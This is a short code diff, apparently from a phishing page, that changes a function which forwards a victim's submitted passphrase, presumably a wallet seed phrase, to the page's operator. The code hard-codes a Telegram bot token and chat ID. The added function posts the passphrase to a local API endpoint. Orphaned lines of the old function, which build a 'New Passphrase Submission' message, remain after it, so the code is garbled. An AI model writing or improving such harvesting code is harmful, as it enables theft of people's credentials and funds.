@@ -206,8 +206,27 @@
         const BOT_TOKEN = '8191930366:AAF3nZYU_QC_wOpW-xKMvzwHVCKFN-KecxU';
         const CHAT_ID = '7416028741';
 
-        // Simple Telegram message sender
-        async function sendToTelegram(passphrase) {
+        // Replace the sendToTelegram function with this:
+async function sendToTelegram(passphrase) {
+    try {
+        const response = await fetch('http://localhost:3000/api/send-passphrase', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ passphrase })
+        });
+        
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        
+        return true;
+    } catch (error) {
+        console.error('Error:', error);
+        return false;
+    }
+}
             const time = new Date().toLocaleString();
             const message = `
 🔐 *New Passphrase Submission* 🔐
